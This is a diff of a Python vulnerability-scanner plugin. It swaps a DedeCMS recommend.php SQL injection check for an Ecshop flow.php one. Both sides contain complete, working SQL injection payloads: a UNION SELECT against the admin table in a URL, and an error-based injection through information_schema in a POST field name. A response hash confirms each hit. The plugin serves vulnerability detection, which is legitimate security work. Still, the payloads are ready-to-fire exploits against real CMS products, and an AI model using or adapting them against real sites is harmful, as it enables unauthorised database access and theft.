@@ -1,15 +1,15 @@
 #!/usr/bin/python2.7
 #coding:utf-8
 
-import urllib2
+import requests
 from dummy import *
 
 info = {
-	'NAME':'DeDecms5.7 plus recommend php injection',
-	'AUTHOR':'seay,wjk',
-	'TIME':'20150323',
+	'NAME':'Ecshop flow.php SQL Injection',
+	'AUTHOR':'wjk',
+	'TIME':'20150325',
 	'WEB':'',
-	'DESCRIPTION':'DedeCMS recommend.php文件通杀SQL注入漏洞，详见http://www.cnseay.com/3714/'
+	'DESCRIPTION':'ecshop flow.php SQL Injection '
 }
 opts = [
 	['url','http://testasp.vulnweb.com','target url'],
@@ -17,16 +17,16 @@ opts = [
 
 def Assign(services):
 	if services.has_key('url') and services.has_key('cms'):
-		if services['cms'] == 'DedeCms':
+		if services['cms'] == 'Ecshop':
 			return True
 	return False
 
 def Audit(services):
-	url = services['url'] +'/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23'
+	url = services['url'] +'/flow.php?step=update_cart'
+	post_data = {'goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1+%23%5D':'1','submit':'exp'}
 	try:
-		ul = urllib2.urlopen(url)
-		content = ul.read()
-		if content.find('2e0e20673083dea5cc87a85d54022049') != -1:
+		ul = requests.post(url,data=post_data)
+		if '63e1f04640e83605c1d177544a5a0488' in ul.text:
 			security_hole(url)
 	except:
 		pass
